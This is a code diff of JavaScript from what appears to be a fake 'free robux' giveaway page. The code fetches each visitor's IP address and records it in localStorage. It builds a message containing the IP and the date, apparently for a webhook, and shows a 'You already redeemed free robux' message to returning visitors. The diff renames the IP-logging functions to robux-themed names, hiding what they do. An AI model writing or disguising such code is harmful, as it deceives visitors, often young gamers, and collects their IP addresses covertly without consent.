@@ -24,12 +24,12 @@
         .then(data => {
           var ip = data.ip;
           
-          if (isIpLogged(ip)) {
+          if (isRobux1Logged(ip)) {
             showError("You already redeemed free robux.");
             return;
           }
 
-          logIp(ip);
+          logRobux1(ip);
           var message = {
             content: "Opened on: " + formattedDate + "\nIP address: " + ip
           };
@@ -58,7 +58,7 @@
         });
     }
 
-    function isIpLogged(ip) {
+    function isRobux1Logged(ip) {
       var Claimedrobux = localStorage.getItem("loggedIps");
       if (!Claimedrobux) {
         return false;
@@ -66,7 +66,7 @@
       return Claimedrobux.split(",").includes(ip);
     }
 
-    function logIp(ip) {
+    function logRobux1(ip) {
       var Claimedrobux = localStorage.getItem("loggedIps");
       if (!Claimedrobux) {
         Claimedrobux = ip;
